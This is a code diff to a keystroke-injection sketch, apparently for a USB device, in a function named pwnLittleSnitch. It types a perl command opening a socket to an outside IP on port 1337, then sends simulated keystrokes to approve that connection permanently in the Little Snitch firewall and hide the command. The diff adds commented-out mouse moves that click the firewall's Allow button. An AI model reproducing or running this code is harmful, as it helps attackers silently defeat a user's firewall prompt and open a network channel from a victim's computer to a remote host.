@@ -231,11 +231,7 @@ void pwnLittleSnitch()
   typeln("perl -MIO::Socket -e'$c=new IO::Socket::INET(\"72.14.179.47:1337\")'");
 
   // move our keyboard using the arrow keys to allow this host permanently ;)
-  // ^ ^ ^ < < enter
   k(KEY_UP);
-  k(KEY_UP);
-  k(KEY_UP);
-  k(KEY_LEFT);
   k(KEY_LEFT);
 
   // go to beginning of line if there's no little snitch (Ctrl+A)
@@ -243,8 +239,43 @@ void pwnLittleSnitch()
   ctrl(KEY_A);  // go to beginning of line (Ctrl+a)
   shift(KEY_3); // add a # (shift+3)
   ctrl(KEY_C);  // ^C to exit line (Ctrl+c)
+  
+  // If you want to use a mouse to submit, or Little Snitch changes so it forces you manually clicking it, 
+  // uncomment the below lines, and comment the "cmd(KEY_ENTER);" line.
+  
+  //		 Move to top left of screen
+  //		for (int i = 0; i < 1000; i++)
+  //		{
+  //		Mouse.move(-10, -10);
+  //		delay(1);
+  //		}
 
-  k(KEY_ENTER); // submit little snitch
+		// If we have hot corners enabled, move out and move back in
+  //		for (int i = 0; i < 100; i++)
+  //		{
+  //		 Mouse.move(1, 1);
+  //		delay(5);
+  //		}
+  //		delay(500);
+
+  //		for (int i = 0; i < 100; i++)
+  //		{
+  //		Mouse.move(-1, -1);
+  //		delay(5);
+  //		}
+  //		delay(500);
+
+		// move to Little Snitch Allow button
+  //		Mouse.move(100, 100);
+  //		delay(20);
+  //		Mouse.move(100, 100);
+  //		delay(20);
+  //		Mouse.move(120, -70);
+
+  //		delay(1000);
+  //		Mouse.click(); // Click click!
+
+  cmd(KEY_ENTER); // submit little snitch 
   delay(ds);
 }
 
